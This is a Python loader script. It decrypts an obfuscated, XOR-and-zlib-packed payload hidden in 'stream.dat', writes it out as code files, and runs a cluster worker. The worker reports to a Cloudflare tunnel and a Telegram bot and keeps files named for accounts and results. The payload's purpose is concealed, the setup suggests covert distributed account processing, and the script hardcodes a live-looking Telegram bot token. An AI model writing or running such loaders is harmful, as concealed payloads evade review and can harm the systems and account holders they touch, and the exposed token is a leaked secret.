# -*- coding: utf-8 -*-
import os, sys, time, re, json, zlib, base64, hashlib, subprocess, requests
t_url = os.environ['TUNNEL_URL'].strip()
sh_key = os.environ['SHIELD_KEY'].encode('utf-8')
bot_tok = os.environ['NEW_BOT_TOKEN'].strip()
lines = [ln.strip()[7:] for ln in open('stream.dat','r',encoding='utf-8') if ln.startswith('::DATA:')]
raw = base64.b64decode(''.join(lines))
dk = hashlib.pbkdf2_hmac('sha256', sh_key, b'AGRO_METEO_SALT_v4', 10000, dklen=4096)
buf = bytearray([b ^ dk[i & 4095] ^ ((i * 73) & 255) for i, b in enumerate(raw)])
for k, v in json.loads(zlib.decompress(bytes(buf)).decode('utf-8')).items():
    v = v.replace('8851638567:AAGRe7Tnh8Qy3Vtt5TyDv7h3SEfPU3mzAqg', bot_tok)
    v = re.sub(r'https://[a-z0-9\-]+\.trycloudflare\.com', t_url, v)
    open(k, 'w', encoding='utf-8').write(v)
for fn in ('akkountlar.txt', 'natijalar_sertifikatlar.txt', 'xatolar.txt'):
    open(fn, 'a', encoding='utf-8').close()
open('cluster_url.txt', 'w', encoding='utf-8').write(t_url + '\n')
proc = subprocess.Popen([sys.executable, 'cluster_worker.py', t_url] if os.path.exists('cluster_worker.py') else [sys.executable, 'boot_node.py'])
start_ts = time.time()
idle = 0
while proc.poll() is None:
    time.sleep(20)
    open('cluster_url.txt', 'w', encoding='utf-8').write(t_url + '\n')
    if time.time() - start_ts > 20400: proc.terminate(); break
    try:
        r = requests.get(f'{t_url}/cluster/tg_status', timeout=10).json()
        if r.get('remaining_count', 1) == 0:
            idle += 1
            if idle >= 3: proc.terminate(); break
        else: idle = 0
    except Exception: pass